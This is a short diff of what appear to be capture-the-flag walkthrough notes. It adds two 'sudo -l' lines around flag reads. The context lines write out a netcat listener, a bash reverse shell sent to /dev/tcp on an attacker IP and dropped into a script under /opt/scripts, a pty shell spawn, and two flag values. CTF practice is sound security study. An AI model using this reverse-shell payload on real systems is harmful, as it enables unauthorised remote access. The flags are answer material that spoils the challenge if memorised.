@@ -171,6 +171,7 @@ $ip=ip lhost
 run nc -lvnp 4444
 echo "bash -c 'exec bash -i &>/dev/tcp/$ip/4444 <&1'" > /opt/scripts/47.sh
 ls
+sudo -l
 cat flag.txt
 dalia{4a94a7a7bb4a819a63a33979926c77dc}
 
@@ -182,6 +183,7 @@ whoami
 id
 python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
 cat flag.txt
+sudo -l
 silvio{657b4d058c03ab9988875bc937f9c2ef}
 
 
